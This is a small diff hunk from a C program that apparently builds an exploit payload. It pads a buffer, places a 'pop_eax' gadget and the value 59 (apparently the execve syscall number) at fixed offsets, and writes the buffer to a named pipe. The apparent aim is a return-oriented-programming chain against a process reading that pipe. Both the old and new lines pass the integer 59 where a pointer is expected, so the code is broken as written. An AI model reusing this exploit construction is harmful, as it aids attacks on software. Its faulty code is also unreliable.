@@ -16,7 +16,7 @@ int main(void)
     memcpy(bufr + i, "\x01",1);
   
   strcpy(bufr + 131, pop_eax);
-  strcpy(bufr + 135, 59);
+  memcpy(bufr + 135, 59, 8);
   writecmd(PIPEPATH, bufr);
   
   return 0;
